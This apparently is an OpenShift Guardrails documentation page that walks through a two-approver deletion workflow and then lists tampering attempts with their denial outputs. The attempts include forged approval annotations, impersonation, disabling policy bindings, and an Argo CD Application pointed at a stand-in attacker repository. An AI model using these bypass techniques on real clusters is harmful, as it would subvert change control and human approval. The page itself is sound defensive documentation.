@@ -1,0 +1,688 @@
+<!DOCTYPE html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
+<title>20-deletion-simulation · OpenShift Guardrails</title><link rel="stylesheet" href="../site.css">
+<script>try{var t=localStorage.getItem('sg-theme');if(t){document.documentElement.setAttribute('data-theme',t)}}catch(e){}</script>
+</head><body>
+<header class="site"><a class="brand" href="../index.html">OpenShift Guardrails</a>
+<nav><a href="../index.html">Index</a><a href="18-the-story.html">Story</a><a href="19-deletion-approval-lifecycle.html">Approvals</a><a href="20-deletion-simulation.html">Simulation</a><a href="../study-guide.html">Study guide</a><a href="15-implementation-guide.html">Implement</a><a href="14-manual-test-guide.html">Test</a><a href="16-production-readiness-review.html">Readiness review</a></nav>
+<button class="toggle" onclick="(function(){var r=document.documentElement;var d=r.getAttribute('data-theme')==='dark'||(!r.getAttribute('data-theme')&&matchMedia('(prefers-color-scheme: dark)').matches);r.setAttribute('data-theme',d?'light':'dark');try{localStorage.setItem('sg-theme',d?'light':'dark')}catch(e){}})()">Theme</button></header>
+<main>
+<h1>20 · Simulation: one critical deletion, step by step, and every attempt to cheat it</h1>
+<p>This document plays out a complete deletion of a critical resource on a <strong>phase-3 (enforcing)</strong> cluster, and then plays out every way an administrator could try to force or fake one. For every step you see:</p>
+<ol>
+<li><strong>the command</strong> that is run, and by whom;</li>
+<li><strong>the expected output</strong>, as the API server prints it;</li>
+<li><strong>the state of the resource afterwards</strong> (the annotations that are the workflow&#39;s memory);</li>
+<li><strong>what is recorded and who is notified</strong>.</li>
+</ol>
+<p>Part B answers the question directly: <em>what happens if an admin edits the annotation values by hand, and can that let them delete something intentionally?</em> Every attempt is shown with its exact outcome. Part D explains <strong>why</strong> each one is impossible rather than merely blocked, and Part E lists the five gaps this simulation exposed, all fixed in this repository.</p>
+<p>Related: <code>docs/19</code> (lifecycle, notifications, lifetimes), <code>docs/04</code> (the rules), <code>docs/14</code> (the manual test guide with sign-off), <code>scripts/test-guardrails.sh</code> (80 automated cases that assert exactly these outcomes).</p>
+<hr>
+<h2>0. The simulated environment</h2>
+<table>
+<thead>
+<tr>
+<th>Item</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Phase</td>
+<td>3 (<code>validationActions: [Deny, Audit]</code> on the deletion bindings; the <code>-hardened</code> binding is Deny in <strong>every</strong> phase)</td>
+</tr>
+<tr>
+<td>Parameters</td>
+<td><code>minApprovers: 2</code>, <code>executorMayBeApprover: false</code>, <code>approvalTTL: 4h</code>, <code>requestTTL: 24h</code></td>
+</tr>
+<tr>
+<td>Target object</td>
+<td><code>configmap/victim</code> in namespace <code>guardrails-test</code>, labelled <code>guardrails.example.com/critical=true</code></td>
+</tr>
+<tr>
+<td>Identities</td>
+<td><code>admin@example.com</code> (JIT <code>platform-admins</code>, may patch and delete), <code>req@example.com</code> (<code>gitops-deletion-requesters</code>), <code>a1@example.com</code>, <code>a2@example.com</code> (<code>gitops-deletion-approvers</code>), <code>dev@example.com</code> (no guardrail role)</td>
+</tr>
+<tr>
+<td>Shell helpers</td>
+<td>as in <code>docs/14</code> §0: <code>as-admin</code>, <code>as-req</code>, <code>as-a1</code>, <code>as-a2</code>, <code>as-dev</code>, <code>ts()</code>, <code>state()</code></td>
+</tr>
+</tbody></table>
+<p><code>state()</code> prints the guardrail annotations of the object, and is what &quot;resource state&quot; means below:</p>
+<pre><code class="language-bash">state() { oc -n guardrails-test get cm &quot;$1&quot; \
+  -o go-template=&#39;{{range $k,$v := .metadata.annotations}}{{if hasPrefix $k &quot;guardrails.&quot;}}{{$k}}={{$v}}{{&quot;\n&quot;}}{{end}}{{end}}&#39;; }
+</code></pre>
+<p><strong>How many people are really needed.</strong> Two approvers, neither of them the requester, and an executor who is not one of the approvers. The executor <strong>may</strong> be the requester, so the minimum is <strong>three distinct people</strong>: requester (who may also execute) plus two approvers. The policy never accepts fewer.</p>
+<pre class="mermaid">sequenceDiagram
+    autonumber
+    participant AD as admin
+    participant RQ as requester
+    participant A1 as approver 1
+    participant A2 as approver 2
+    participant EX as executor
+    participant API as kube-apiserver with the policies
+    AD->>API: step 1 oc delete configmap victim
+    API-->>AD: 403 GUARDRAIL DENIED, found 0 approvals
+    RQ->>API: step 2 request-deletion.sh
+    API-->>RQ: annotated, state requested, remaining 2
+    A1->>API: step 4 approve-deletion.sh
+    API-->>A1: annotated, have 1 need 2 remaining 1
+    EX->>API: step 5 oc delete
+    API-->>EX: 403 GUARDRAIL DENIED, found 1
+    A2->>API: step 6 approve-deletion.sh
+    API-->>A2: annotated, have 2 remaining 0 ready
+    EX->>API: step 8 execute-deletion.sh
+    API-->>EX: configmap victim deleted</pre>
+<hr>
+<h1>Part A · The happy path, step by step</h1>
+<h2>Step 0 — the object before anything happens</h2>
+<pre><code class="language-bash">$ as-admin -n guardrails-test create configmap victim --from-literal=a=b
+$ as-a1 -n guardrails-test label configmap victim guardrails.example.com/critical=true
+</code></pre>
+<pre><code class="language-text">configmap/victim created
+configmap/victim labeled
+</code></pre>
+<p>Only an approver, a trusted GitOps identity or break-glass may attach the critical label (<code>guardrails-critical-label-control</code>); <code>as-admin</code> doing the same is denied unless the admin is also an approver.</p>
+<p><strong>Resource state</strong></p>
+<pre><code class="language-text">$ state victim
+(no output: no guardrail annotations yet)
+$ oc -n guardrails-test get cm victim --show-labels
+NAME     DATA   AGE   LABELS
+victim   1      5s    guardrails.example.com/critical=true
+</code></pre>
+<h2>Step 1 — the accident: a straight delete by a cluster-admin</h2>
+<pre><code class="language-bash">$ as-admin -n guardrails-test delete configmap victim
+</code></pre>
+<pre><code class="language-text">Error from server (Forbidden): configmaps &quot;victim&quot; is forbidden: ValidatingAdmissionPolicy &#39;guardrails-critical-delete&#39;
+with binding &#39;guardrails-critical-delete-labelled&#39; denied request: GUARDRAIL DENIED: deleting critical configmaps
+guardrails-test/victim requires a delete-request and at least 2 distinct approvals from gitops-deletion-approvers
+and a delete-requested-at time (found 0, requested-by=, executor may not be an approver).
+Runbook: https://github.com/example-org/openshift-administration/blob/main/docs/09-runbooks.md
+</code></pre>
+<p><strong>Resource state:</strong> unchanged; the object still exists.</p>
+<p><strong>Recorded / notified:</strong> audit event <code>verb=delete</code>, <code>responseStatus.code=403</code>, annotation <code>guardrails-critical-delete/decision = op=DELETE user=admin@example.com … approved=false exempt=false gitops=false</code> → <strong><code>CriticalResourceDeleteDenied</code></strong> (warning) to the platform Teams channel within ~60 s.</p>
+<h2>Step 2 — the requester opens a request</h2>
+<pre><code class="language-bash">$ KUBECONFIG=~/.kube/req.kubeconfig scripts/request-deletion.sh configmap victim -n guardrails-test &quot;CHG0012345: decommission test instance&quot;
+</code></pre>
+<pre><code class="language-text">Opening deletion request on configmap/victim as req@example.com
+configmap/victim annotated
+Request recorded. The approvers channel is notified automatically (CriticalDeletionRequested).
+2 members of gitops-deletion-approvers (not yourself) must run within 24h:
+  ./approve-deletion.sh configmap victim -n guardrails-test
+Resource     : configmap/victim -n guardrails-test
+critical     : true
+request      : CHG0012345: decommission test instance
+requested-by : req@example.com
+requested-at : 2026-09-19T08:00:00Z  -&gt; expires 2026-09-20T08:00:00Z (1440 min left)
+approvals    : &lt;none&gt;
+progress     : 0 of 2 valid approvals -&gt; 2 more approval(s) needed
+</code></pre>
+<p><strong>Resource state</strong></p>
+<pre><code class="language-text">$ state victim
+guardrails.example.com/delete-request=CHG0012345: decommission test instance
+guardrails.example.com/delete-requested-by=req@example.com
+guardrails.example.com/delete-requested-at=2026-09-19T08:00:00Z
+</code></pre>
+<p><strong>Recorded / notified:</strong> tracker annotation
+<code>event=requested open=1 ready=0 have=0 need=2 remaining=2 requested_by=req@example.com requested_at=2026-09-19T08:00:00Z request_expires=2026-09-20T08:00:00Z first_approval_expires=none actor=req@example.com approvers=&quot;&quot; req=&quot;CHG0012345: decommission test instance&quot;</code>
+→ <strong><code>CriticalDeletionRequested</code></strong> to the approvers&#39; mailbox and Teams channel:</p>
+<pre><code class="language-text">🔵 [FIRING] CriticalDeletionRequested - configmaps guardrails-test/victim
+APPROVAL NEEDED: req@example.com requests deletion of configmaps guardrails-test/victim
+Reason: CHG0012345: decommission test instance. 2 approvals from gitops-deletion-approvers are needed
+(not the requester). The request expires at 2026-09-20T08:00:00Z. Review the change ticket, then approve with:
+scripts/approve-deletion.sh configmaps victim -n guardrails-test
+- Requested by: req@example.com: CHG0012345: decommission test instance
+- Request expires: 2026-09-20T08:00:00Z
+</code></pre>
+<h2>Step 3 — anyone can check where it stands</h2>
+<pre><code class="language-bash">$ KUBECONFIG=~/.kube/a1.kubeconfig scripts/status-deletion.sh configmap victim -n guardrails-test
+</code></pre>
+<pre><code class="language-text">Resource     : configmap/victim -n guardrails-test
+critical     : true
+request      : CHG0012345: decommission test instance
+requested-by : req@example.com
+requested-at : 2026-09-19T08:00:00Z  -&gt; expires 2026-09-20T08:00:00Z (1438 min left)
+approvals    : &lt;none&gt;
+progress     : 0 of 2 valid approvals -&gt; 2 more approval(s) needed
+</code></pre>
+<h2>Step 4 — approver 1 approves</h2>
+<pre><code class="language-bash">$ KUBECONFIG=~/.kube/a1.kubeconfig scripts/approve-deletion.sh configmap victim -n guardrails-test
+</code></pre>
+<pre><code class="language-text">Request by   : req@example.com
+Reason       : CHG0012345: decommission test instance
+…state…
+Approve deletion of configmap/victim as a1@example.com? Type &#39;approve&#39; to continue: approve
+configmap/victim annotated
+Approval recorded at 2026-09-19T08:05:12Z (valid for 4h). The approvers channel is notified (CriticalDeletionApproved).
+progress     : 1 of 2 valid approvals -&gt; 1 more approval(s) needed
+</code></pre>
+<p><strong>Resource state</strong></p>
+<pre><code class="language-text">$ state victim
+guardrails.example.com/delete-request=CHG0012345: decommission test instance
+guardrails.example.com/delete-requested-by=req@example.com
+guardrails.example.com/delete-requested-at=2026-09-19T08:00:00Z
+guardrails.example.com/delete-approvals=a1@example.com|2026-09-19T08:05:12Z
+</code></pre>
+<p><strong>Recorded / notified:</strong> <code>event=approved have=1 need=2 remaining=1 first_approval_expires=2026-09-19T12:05:12Z actor=a1@example.com approvers=&quot;a1@example.com&quot;</code> → <strong><code>CriticalDeletionApproved</code></strong>: <em>&quot;Approval 1 of 2 recorded by <a href="mailto:a1@example.com">a1@example.com</a> … - 1 remaining&quot;</em>. After 15 minutes without a second approval, <strong><code>CriticalDeletionPendingApproval</code></strong> repeats hourly.</p>
+<h2>Step 5 — executing too early</h2>
+<pre><code class="language-bash">$ KUBECONFIG=~/.kube/req.kubeconfig scripts/execute-deletion.sh configmap victim -n guardrails-test
+</code></pre>
+<pre><code class="language-text">…state…
+progress     : 1 of 2 valid approvals -&gt; 1 more approval(s) needed
+Only 1 distinct approvals, 2 required. Deletion will be denied.
+</code></pre>
+<p>The script stops before calling the API. Bypassing the script hits the policy:</p>
+<pre><code class="language-bash">$ as-req -n guardrails-test delete configmap victim
+→ Error from server (Forbidden): … GUARDRAIL DENIED: deleting critical configmaps guardrails-test/victim requires …
+  (found 1, requested-by=req@example.com, executor may not be an approver). …
+</code></pre>
+<p><strong>Resource state:</strong> unchanged.</p>
+<h2>Step 6 — approver 2 approves</h2>
+<pre><code class="language-bash">$ KUBECONFIG=~/.kube/a2.kubeconfig scripts/approve-deletion.sh configmap victim -n guardrails-test
+</code></pre>
+<pre><code class="language-text">configmap/victim annotated
+Approval recorded at 2026-09-19T09:40:03Z (valid for 4h). The approvers channel is notified (CriticalDeletionApproved).
+progress     : 2 of 2 valid approvals -&gt; FULLY APPROVED: a third person (not an approver) may execute
+</code></pre>
+<p><strong>Resource state</strong></p>
+<pre><code class="language-text">guardrails.example.com/delete-approvals=a1@example.com|2026-09-19T08:05:12Z,a2@example.com|2026-09-19T09:40:03Z
+</code></pre>
+<p><strong>Notified:</strong> <em>&quot;Approval 2 of 2 recorded by <a href="mailto:a2@example.com">a2@example.com</a> … - FULLY APPROVED&quot;</em>, with <em>&quot;may now run scripts/execute-deletion.sh before 2026-09-19T12:05:12Z, when the oldest approval expires&quot;</em>. If nobody executes for 30 minutes, <strong><code>CriticalDeletionAwaitingExecution</code></strong> repeats hourly.</p>
+<h2>Step 7 — an approver tries to execute</h2>
+<pre><code class="language-bash">$ as-a1 -n guardrails-test delete configmap victim
+</code></pre>
+<pre><code class="language-text">Error from server (Forbidden): … GUARDRAIL DENIED: deleting critical configmaps guardrails-test/victim requires
+a delete-request and at least 2 distinct approvals … (found 2, requested-by=req@example.com,
+executor may not be an approver). …
+</code></pre>
+<p>Two approvals exist, yet the deletion is refused because the deleter is one of the approvers (<code>executorMayBeApprover: false</code>). <strong>Resource state:</strong> unchanged.</p>
+<h2>Step 8 — the executor deletes</h2>
+<pre><code class="language-bash">$ KUBECONFIG=~/.kube/req.kubeconfig scripts/execute-deletion.sh configmap victim -n guardrails-test
+</code></pre>
+<pre><code class="language-text">…state…
+progress     : 2 of 2 valid approvals -&gt; FULLY APPROVED: a third person (not an approver) may execute
+Delete configmap/victim -n guardrails-test NOW as req@example.com? Type the resource name to confirm: victim
+configmap &quot;victim&quot; deleted
+Deletion accepted. Expect CriticalResourceDeleted (email + Teams) within ~60s.
+Audit trail (Loki / logcli):
+  logcli query --org-id=audit &#39;{log_type=&quot;audit&quot;} | json | objectRef_name=&quot;victim&quot; | verb=~&quot;patch|update|delete&quot;&#39; --since=24h
+</code></pre>
+<p><strong>Resource state:</strong> the object no longer exists, and its annotations went with it.</p>
+<pre><code class="language-text">$ state victim
+Error from server (NotFound): configmaps &quot;victim&quot; not found
+</code></pre>
+<p><strong>Recorded / notified:</strong> <code>decision = op=DELETE user=req@example.com … approved=true exempt=false</code>; tracker <code>event=executed</code>. Two messages: <strong><code>CriticalResourceDeleted</code></strong> (critical, red, email + Teams, repeats every 30 min until acknowledged) and <strong><code>CriticalDeletionRequestClosed</code></strong> (<code>event=executed</code>) to the approvers.</p>
+<h2>Step 9 — the evidence afterwards</h2>
+<pre><code class="language-bash">$ logcli query --org-id=audit --since=24h \
+  &#39;{log_type=&quot;audit&quot;} | json | objectRef_name=&quot;victim&quot; | verb=~&quot;patch|update|delete&quot;
+   | line_format &quot;{{.requestReceivedTimestamp}} {{.verb}} {{.user_username}} {{.responseStatus_code}} {{.annotations_guardrails_deletion_tracker_state}}&quot;&#39;
+</code></pre>
+<pre><code class="language-text">2026-09-19T07:58:02Z delete admin@example.com 403
+2026-09-19T08:00:00Z patch  req@example.com   200 event=requested have=0 need=2 remaining=2 …
+2026-09-19T08:05:12Z patch  a1@example.com    200 event=approved  have=1 need=2 remaining=1 …
+2026-09-19T09:38:55Z delete req@example.com   403
+2026-09-19T09:40:03Z patch  a2@example.com    200 event=approved  have=2 need=2 remaining=0 ready=1 …
+2026-09-19T09:41:10Z delete a1@example.com    403
+2026-09-19T09:42:31Z delete req@example.com   200 event=executed  have=2 need=2 …
+</code></pre>
+<p>Every step, including each refusal, is attributable. The same query runs in Splunk (<code>scripts/audit-query.sh victim</code> prints both).</p>
+<hr>
+<h1>Part B · Tampering: what happens if an admin edits the annotations by hand</h1>
+<p>Setup for this part: the object exists again, labelled critical, with an open request by <code>req@example.com</code> and <strong>one</strong> approval from <code>a1@example.com</code>. <code>admin@example.com</code> is a JIT <code>platform-admins</code> member — the strongest identity a human can hold here (<code>guardrails-platform-admin</code>: every verb except <code>impersonate</code>, <code>escalate</code>, <code>bind</code>) — and is <strong>not</strong> in the approver group.</p>
+<p><strong>Summary: what a human can and cannot write</strong></p>
+<table>
+<thead>
+<tr>
+<th>Annotation change</th>
+<th>Allowed?</th>
+<th>Rule</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Add an approval entry naming <strong>yourself</strong>, if you are an approver, not the requester, not already listed</td>
+<td>yes</td>
+<td>V3</td>
+</tr>
+<tr>
+<td>Add an approval entry naming <strong>anyone else</strong></td>
+<td>no</td>
+<td>V3</td>
+</tr>
+<tr>
+<td>Add two entries at once</td>
+<td>no</td>
+<td>V3</td>
+</tr>
+<tr>
+<td>Re-add yourself (also with different capitalisation)</td>
+<td>no</td>
+<td>V3</td>
+</tr>
+<tr>
+<td>Change or reorder existing entries</td>
+<td>no</td>
+<td>V3</td>
+</tr>
+<tr>
+<td>Delete <strong>all</strong> approvals (cancel)</td>
+<td>yes, and it only makes deletion harder</td>
+<td>V3</td>
+</tr>
+<tr>
+<td>Delete <strong>some</strong> approvals</td>
+<td>no (only the reaper may prune)</td>
+<td>V3</td>
+</tr>
+<tr>
+<td>Open a request naming yourself, with a reason and a valid time</td>
+<td>yes</td>
+<td>V4</td>
+</tr>
+<tr>
+<td>Open a request naming someone else</td>
+<td>no</td>
+<td>V4</td>
+</tr>
+<tr>
+<td>Edit the reason or the time while approvals exist</td>
+<td>no</td>
+<td>V4</td>
+</tr>
+<tr>
+<td>Clear the whole request</td>
+<td>yes</td>
+<td>V4</td>
+</tr>
+<tr>
+<td>Remove the critical label</td>
+<td>no</td>
+<td>V2</td>
+</tr>
+<tr>
+<td>Change anything else in the same write as an approval</td>
+<td>no</td>
+<td>V3/V4 <code>payloadUnchanged</code></td>
+</tr>
+</tbody></table>
+<h2>A1 — write both approvals in one command</h2>
+<pre><code class="language-bash">$ as-admin -n guardrails-test annotate configmap victim --overwrite \
+    &quot;guardrails.example.com/delete-approvals=a1@example.com|$(ts),a2@example.com|$(ts)&quot;
+</code></pre>
+<pre><code class="language-text">Error from server (Forbidden): configmaps &quot;victim&quot; is forbidden: ValidatingAdmissionPolicy &#39;guardrails-critical-delete&#39;
+with binding &#39;guardrails-critical-delete-labelled&#39; denied request: GUARDRAIL DENIED: invalid change to
+guardrails.example.com/delete-approvals by admin@example.com. Rules: append exactly one entry
+&quot;&lt;your-username&gt;|&lt;RFC3339 UTC&gt;&quot;, be a member of gitops-deletion-approvers, not be the requester, not approve twice,
+change nothing else in the object. Clearing the annotation is always allowed.
+</code></pre>
+<p><strong>State:</strong> unchanged (still one approval). <strong>Why impossible:</strong> V3 accepts at most <strong>one added entry</strong>, and that entry must literally contain <code>request.userInfo.username</code> — the name the API server authenticated, which the caller cannot choose.</p>
+<h2>A2 — append one approval, but name an approver</h2>
+<pre><code class="language-bash">$ as-admin -n guardrails-test annotate configmap victim --overwrite \
+    &quot;guardrails.example.com/delete-approvals=a1@example.com|2026-09-19T08:05:12Z,a2@example.com|$(ts)&quot;
+</code></pre>
+<pre><code class="language-text">Error from server (Forbidden): … GUARDRAIL DENIED: invalid change to guardrails.example.com/delete-approvals by admin@example.com …
+</code></pre>
+<p><strong>State:</strong> unchanged. Even a perfectly formed entry fails: <code>addedApprovals[0].split(&#39;|&#39;)[0] == request.userInfo.username</code> is false, and no flag, header or field lets a caller change that value. The only way to make it true is to <em>be</em> <code>a2@example.com</code>, which means holding that person&#39;s credentials (an incident in its own right, alerted by <code>ImpersonationUsed</code> if attempted with <code>--as</code>, see A12).</p>
+<h2>A3 — the admin joins the approver group first</h2>
+<pre><code class="language-bash">$ as-admin patch group gitops-deletion-approvers --type merge -p &#39;{&quot;users&quot;:[&quot;a1@example.com&quot;,&quot;a2@example.com&quot;,&quot;admin@example.com&quot;]}&#39;
+</code></pre>
+<pre><code class="language-text">Error from server (Forbidden): groups.user.openshift.io &quot;gitops-deletion-approvers&quot; is forbidden:
+ValidatingAdmissionPolicy &#39;guardrails-gitops-only-mutation&#39; with binding &#39;guardrails-gitops-only-mutation-hardened&#39;
+denied request: GUARDRAIL: critical groups gitops-deletion-approvers may only be changed through Git (Argo CD) -
+direct edit by admin@example.com is not permitted. Open a PR.
+</code></pre>
+<p><strong>State:</strong> group unchanged. Approver groups are in the self-protection set: <strong>Deny in every phase</strong>, including phase 1. Through Git it needs two reviewers and code-owner approval from platform <em>and</em> security, and it fires <code>PrivilegedRBACChange</code>.</p>
+<h2>A4 — approve twice, the second time with different capitalisation</h2>
+<pre><code class="language-bash">$ as-a1 -n guardrails-test annotate configmap victim --overwrite \
+    &quot;guardrails.example.com/delete-approvals=a1@example.com|2026-09-19T08:05:12Z,A1@EXAMPLE.COM|$(ts)&quot;
+</code></pre>
+<pre><code class="language-text">Error from server (Forbidden): … GUARDRAIL DENIED: invalid change to guardrails.example.com/delete-approvals by a1@example.com …
+</code></pre>
+<p><strong>State:</strong> unchanged. Duplicate detection and the &quot;requester is not an approver&quot; and &quot;executor is not an approver&quot; checks all compare lower-cased names, so a second identity that differs only in case counts as the same person (gap <strong>G11</strong>, fixed).</p>
+<h2>A5 — a malformed or back-dated entry</h2>
+<pre><code class="language-bash">$ as-a1 -n guardrails-test annotate configmap victim --overwrite \
+    &quot;guardrails.example.com/delete-approvals=a1@example.com|2026-09-19T08:05:12Z,a2@example.com|soon&quot;
+→ Error from server (Forbidden): … invalid change to guardrails.example.com/delete-approvals by a1@example.com …   (regex rejects it)
+</code></pre>
+<p>A <em>well-formed but old</em> timestamp is accepted at admission (CEL has no clock) and is removed by the reaper within 10 minutes, which also notifies the approvers (<code>CriticalDeletionApprovalsExpired</code>):</p>
+<pre><code class="language-text">$ oc -n guardrails-system logs job/approval-reaper-…
+expire configmaps guardrails-test/victim approver=a2@example.com at=2000-01-01T00:00:00Z (ttl or future/invalid timestamp)
+pending configmaps guardrails-test/victim requested_at=2026-09-19T08:00:00Z approvals=a1@example.com|2026-09-19T08:05:12Z
+</code></pre>
+<p>A <em>future</em> timestamp (an attempt to make an approval outlive its TTL) is removed the same way when it is more than 5 minutes ahead.</p>
+<h2>A6 — smuggle a real change into an approval</h2>
+<pre><code class="language-bash">$ as-a2 -n guardrails-test patch configmap victim --type merge \
+    -p &#39;{&quot;metadata&quot;:{&quot;annotations&quot;:{&quot;guardrails.example.com/delete-approvals&quot;:&quot;a1@example.com|2026-09-19T08:05:12Z,a2@example.com|2026-09-19T09:40:03Z&quot;}},&quot;data&quot;:{&quot;a&quot;:&quot;hacked&quot;}}&#39;
+</code></pre>
+<pre><code class="language-text">Error from server (Forbidden): … GUARDRAIL DENIED: invalid change to guardrails.example.com/delete-approvals by a2@example.com …
+</code></pre>
+<p><strong>State:</strong> unchanged, including <code>data</code>. An approval write may change <strong>nothing</strong> but the guardrail annotations: <code>payloadUnchanged</code> compares <code>spec</code>, <code>data</code>, <code>stringData</code>, <code>binaryData</code>, <code>immutable</code>, <code>rules</code>, <code>subjects</code>, <code>roleRef</code>, <code>users</code>, <code>webhooks</code>, <code>aggregationRule</code>, <code>secrets</code>, <code>imagePullSecrets</code>, <code>automountServiceAccountToken</code>, Application <code>operation</code>, labels, finalizers and ownerReferences (the last four fields were added as gap <strong>G10</strong>).</p>
+<h2>A7 — unlabel it, then delete it</h2>
+<pre><code class="language-bash">$ as-admin -n guardrails-test label configmap victim guardrails.example.com/critical-
+</code></pre>
+<pre><code class="language-text">Error from server (Forbidden): configmaps &quot;victim&quot; is forbidden: ValidatingAdmissionPolicy &#39;guardrails-critical-delete&#39;
+with binding &#39;guardrails-critical-delete-labelled&#39; denied request: GUARDRAIL DENIED: removing the
+guardrails.example.com/critical label requires the same approvals as a deletion.
+</code></pre>
+<p><strong>Why it cannot be raced:</strong> the binding&#39;s <code>objectSelector</code> is evaluated against the old <strong>or</strong> the new object, so a request that removes the label still matches the policy, and V2 denies it.</p>
+<h2>A8 — change the reason after the approvals are in, or refresh the clock</h2>
+<pre><code class="language-bash">$ as-req -n guardrails-test annotate configmap victim --overwrite &quot;guardrails.example.com/delete-request=CHG0012345: delete the production instance instead&quot;
+→ Error from server (Forbidden): … GUARDRAIL DENIED: invalid deletion request change by req@example.com. delete-requested-by must
+  equal your username, you must be in gitops-deletion-requesters,gitops-operators,gitops-deletion-approvers, delete-request must be
+  non-empty, delete-requested-at must be an RFC3339 UTC time (YYYY-MM-DDThh:mm:ssZ), approvals must be empty when the request
+  changes, and nothing else may change.
+
+$ as-req -n guardrails-test annotate configmap victim --overwrite &quot;guardrails.example.com/delete-requested-at=$(ts)&quot;
+→ Error from server (Forbidden): … same message …
+</code></pre>
+<p><strong>State:</strong> unchanged. Approvals are bound to the exact text, author and time they were given for. Re-opening the request with <code>request-deletion.sh</code> is allowed, and it clears the approvals in the same write — so the approvers must look at the new reason.</p>
+<h2>A9 — sabotage: clear the approvals or the request</h2>
+<pre><code class="language-bash">$ as-admin -n guardrails-test annotate configmap victim --overwrite &quot;guardrails.example.com/delete-approvals-&quot;
+→ configmap/victim annotated
+</code></pre>
+<p>This <strong>is</strong> allowed, for everyone with patch rights, and it is the one hand edit that succeeds. It can only <em>remove</em> progress, never create it, and it is not silent: the tracker records <code>event=approvals-cleared actor=admin@example.com</code>, the approvers are told (<code>CriticalDeletionRequestClosed</code>), and <code>status-deletion.sh</code> shows <code>0 of 2</code>. The same applies to <code>cancel-deletion.sh</code>. Deleting the object right afterwards is refused (<code>found 0</code>).</p>
+<h2>A10 — turn off the guardrail first</h2>
+<pre><code class="language-bash">$ as-admin patch validatingadmissionpolicybinding guardrails-critical-delete-labelled --type merge -p &#39;{&quot;spec&quot;:{&quot;validationActions&quot;:[&quot;Audit&quot;]}}&#39;
+→ Error from server (Forbidden): … binding &#39;guardrails-gitops-only-mutation-hardened&#39; denied request: GUARDRAIL: critical
+  validatingadmissionpolicybindings guardrails-critical-delete-labelled may only be changed through Git (Argo CD) …
+
+$ as-admin patch guardrailconfig default --type merge -p &#39;{&quot;spec&quot;:{&quot;minApprovers&quot;:1,&quot;exemptUsers&quot;:[&quot;system:apiserver&quot;,&quot;admin@example.com&quot;]}}&#39;
+→ Error from server (Forbidden): … &#39;guardrails-gitops-only-mutation-hardened&#39; denied request …
+
+$ as-admin delete validatingadmissionpolicybinding guardrails-critical-delete-labelled
+→ Error from server (Forbidden): … GUARDRAIL DENIED: deleting critical validatingadmissionpolicybindings … (found 0, …)
+
+$ as-admin -n guardrails-system patch cronjob approval-reaper --type merge -p &#39;{&quot;spec&quot;:{&quot;suspend&quot;:true}}&#39;
+→ Error from server (Forbidden): … &#39;guardrails-gitops-only-mutation-hardened&#39; denied request …
+</code></pre>
+<p>Through Git these changes need two reviewers, and the CI invariants reject <code>minApprovers &lt; 2</code>, a human in <code>exemptUsers</code>, or a binding that drops <code>Deny</code>. If the policy objects were somehow removed, Argo CD self-heal restores them within about 3 minutes and <code>GuardrailPolicyModified</code> pages the on-call.</p>
+<p><a id="a8"></a></p>
+<h2>A11 — repoint the guardrails Application at the audit-only overlay</h2>
+<p>The subtle one, and a <strong>real gap found by this simulation</strong> (<strong>G9</strong>, now fixed). Each overlay renders the Application pointing at itself, so a single patch used to be enough to move the cluster back to phase 1 permanently — applied, legitimately, by the exempt Argo CD controller.</p>
+<pre><code class="language-bash">$ as-admin -n openshift-gitops patch application guardrails --type merge -p &#39;{&quot;spec&quot;:{&quot;source&quot;:{&quot;path&quot;:&quot;manifests/overlays/phase1-audit&quot;}}}&#39;
+</code></pre>
+<pre><code class="language-text">Error from server (Forbidden): applications.argoproj.io &quot;guardrails&quot; is forbidden: ValidatingAdmissionPolicy
+&#39;guardrails-gitops-only-mutation&#39; with binding &#39;guardrails-gitops-only-mutation-hardened&#39; denied request:
+GUARDRAIL: critical applications openshift-gitops/guardrails may only be changed through Git (Argo CD) -
+direct edit by admin@example.com is not permitted. Open a PR.
+</code></pre>
+<p>Critical <code>Application</code>, <code>ApplicationSet</code>, <code>AppProject</code> and <code>ArgoCD</code> objects are now in the always-Deny set. Tenant Applications are not labelled critical and are unaffected. A phase change is a PR: Git renders the new path and the Argo CD controller applies it.</p>
+<h2>A12 — create a <em>new</em> Application that applies whatever you like</h2>
+<p>Because the Argo CD controller is exempt, anything it applies is pre-approved. Creating an Application is a CREATE, which the mutation policy does not cover, so the remaining control is Argo CD&#39;s own fencing — and the stock <code>default</code> project allows every repo and kind (<strong>G12</strong>, now fixed by shipping a locked <code>default</code> project):</p>
+<pre><code class="language-bash">$ as-admin -n openshift-gitops apply -f - &lt;&lt;&#39;EOF&#39;
+apiVersion: argoproj.io/v1alpha1
+kind: Application
+metadata: { name: totally-normal, namespace: openshift-gitops }
+spec:
+  project: default
+  source: { repoURL: https://github.com/attacker/stuff.git, targetRevision: HEAD, path: . }
+  destination: { server: https://kubernetes.default.svc, namespace: guardrails-system }
+  syncPolicy: { automated: { prune: true } }
+EOF
+→ application.argoproj.io/totally-normal created
+</code></pre>
+<pre><code class="language-text">$ oc -n openshift-gitops get application totally-normal -o jsonpath=&#39;{.status.conditions[*].message}&#39;
+application repo https://github.com/attacker/stuff.git is not permitted in project &#39;default&#39;
+</code></pre>
+<p>Nothing is applied. The <code>default</code> project has empty <code>sourceRepos</code>, <code>destinations</code> and whitelists, so no Application placed in it can sync anywhere, and the project itself is critical (editing it needs Git — see A10). Creating the Application is still reported: <strong><code>ArgoCDApplicationWrittenOutOfBand</code></strong> (warning) names the user, object and verb, so the platform team removes it. Legitimate applications live in named projects defined in Git.</p>
+<h2>A13 — impersonate an approver</h2>
+<pre><code class="language-bash">$ as-admin --as=a2@example.com --as-group=gitops-deletion-approvers -n guardrails-test annotate configmap victim --overwrite \
+    &quot;guardrails.example.com/delete-approvals=a1@example.com|2026-09-19T08:05:12Z,a2@example.com|$(ts)&quot;
+</code></pre>
+<pre><code class="language-text">Error from server (Forbidden): configmaps &quot;victim&quot; is forbidden: ValidatingAdmissionPolicy
+&#39;guardrails-impersonation-dry-run-only&#39; with binding &#39;guardrails-impersonation-dry-run-only&#39; denied request:
+GUARDRAIL DENIED: a2@example.com has no authentication marker (scopes.authorization.openshift.io), so this session
+is impersonated or uses a legacy token. Impersonation may only be used with --dry-run=server or for reads;
+log in as yourself to UPDATE configmaps victim.
+</code></pre>
+<p>The request arrives under the impersonated name (<code>a2@example.com</code>), which is exactly why it fails: a real session of that person carries the OAuth marker, and this one does not.</p>
